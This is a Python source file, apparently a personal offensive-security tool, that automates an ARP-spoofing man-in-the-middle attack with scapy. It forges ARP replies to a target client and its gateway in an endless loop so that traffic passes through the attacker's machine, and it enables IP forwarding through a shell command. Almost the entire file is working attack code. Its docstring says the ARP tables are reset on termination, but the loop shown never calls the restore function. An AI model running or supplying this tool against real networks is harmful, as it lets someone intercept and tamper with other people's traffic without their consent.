#!/usr/bin/env python

# Author: Matthew Zito (goldmund) 
# Contact: https://www.github.com/MatthewZito
# Version: 0.1.0

"""
Accepts as input a target client IP and gateway IP. Automates an
ARP Spoof whereby the controller is established as the MITM, or 
intermediary entity between the given client/gateway. Port-forwarding
is auto-enabled, and both client and gateway ARP tables are reset
upon user-termination.
"""

import scapy.all as scapy
import time
import sys
import subprocess
from subprocess import Popen

class Spoofer:
    def resolve_mac_from_ip(self, ip_address):
        """
        Accepts as input an IP address, resolves its corresponding MAC address,
        and returns said MAC address.
        """
        arp_request = scapy.ARP(pdst=ip_address)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        acknowledged_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        return acknowledged_list[0][1].hwsrc
        
    def spoof(self, target_ip, spoof_ip):
        """
        Accepts as input the target IP and the spoof IP.
        Sends packets to manipulate the target's
        IP tables to associate the controller with the spoof IP.
        """
        target_mac = self.resolve_mac_from_ip(target_ip)
        arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(arp_response_packet, verbose=False)

    def restore_defaults(self, dest_ip, src_ip):
        """
        Restores target(s) ARP tables.
        """
        dest_mac = self.resolve_mac_from_ip(dest_ip)
        src_mac = self.resolve_mac_from_ip(src_ip)
        arp_packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
        scapy.send(arp_packet, count=4, verbose=False)

    def enable_port_fwd(self):
        """
        Enables port forwarding through controller machine.
        """
        print("[+] Enabling port forwarding.")
        ip_fwd_cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
        # test_cmd = "echo 1 >> hello.txt"
        proc = subprocess.Popen(ip_fwd_cmd, shell=True, stdout=subprocess.PIPE)
        print(proc.communicate()[0]),

    def run(self, target_ip, gateway_ip):
        self.enable_port_fwd()
        sent_packets_count = 0
        while True:
            self.spoof(target_ip, gateway_ip) # client, I am the router
            self.spoof(gateway_ip, target_ip) # router, I am the client
            # python3 #print(f"\r[+] Transaction successful. Packets sent: str(sent_packets_count)", end="")
            print("\r[+] Transaction successful. Packets sent: " + str(sent_packets_count)),
            sent_packets_count += 2
            sys.stdout.flush()
            time.sleep(2)



   